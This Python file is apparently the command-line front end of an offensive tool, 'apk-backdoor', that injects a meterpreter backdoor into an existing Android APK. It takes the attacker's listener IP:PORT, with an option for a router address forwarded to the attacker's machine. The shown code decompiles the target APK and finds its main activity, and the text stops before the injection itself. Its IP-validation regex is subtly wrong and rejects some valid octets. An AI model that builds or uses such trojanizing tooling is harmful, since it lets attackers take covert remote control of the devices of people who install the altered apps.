import os
import argparse
import logging
import re
from collections import namedtuple

from . import __version__
from .apk import Apk


def ip_port_value(string):
    ip_pattern = re.compile(r"^((?:(?:25[0-5]|2[0-4][0-5]|1[0-9][0-9]|[1-9][0-9]|[0-9])\.){3}(?:(25[0-5]|2[0-4][0-5]|1[0-9][0-9]|[1-9][0-9]|[0-9]))):(\d+?)$")
    match = ip_pattern.match(string)
    if not match:
        raise argparse.ArgumentTypeError(f"The value '{string}' is not in the form IP:PORT")

    HostAddress = namedtuple('HostAddress', ['ip', 'port'])
    return HostAddress(ip=match[1], port=match[3])


def setup_args():
    parser = argparse.ArgumentParser(
        description='Inject a meterpreter backdoor in an existing APK',
        prog='apk-backdoor',
    )

    parser.add_argument(
        '-v', '--version',
        action='version',
        version=f"%(prog)s - v{__version__}"
    )

    parser.add_argument(
        'apk',
        metavar='APK',
        help='The APK where the backdoor will be injected',
    )

    parser.add_argument(
        'host',
        metavar='HOST',
        help='The host (in the form IP:PORT) to which the payload will send data',
        type=ip_port_value
    )

    parser.add_argument(
        '--host', '-H',
        metavar='REAL_HOST',
        help='The host (in the form IP:PORT) to which the payload will send data.'
             ' Use this if HOST is in a private network: REAL_HOST will be the '
             "router's public IP (and the port that the router will forward to "
             "the attacker's machine)",
        type=ip_port_value
    )

    parser.add_argument(
        '-V', '--verbose',
        dest='verbosity',
        action='count',
        default=0,
        help='Verbosity level (between 1 and 4 occurrences with '
             'more leading to a more verbose logging). '
             'CRITICAL = 0, ERROR = 1, WARN = 2, INFO = 3, DEBUG = 4.'
    )
    log_levels = {
        0: logging.CRITICAL,
        1: logging.ERROR,
        2: logging.WARN,
        3: logging.INFO,
        4: logging.DEBUG,
    }

    args = parser.parse_args()
    args.verbosity = log_levels[args.verbosity]
    return args


def main():
    args = setup_args()
    logging.basicConfig(level=args.verbosity)

    apk = Apk(args.apk)
    apk.decompile()
    main_activity, main_activity_file = apk.get_main_activity()
    logging.info(f"The main activity is: '{main_activity}'")
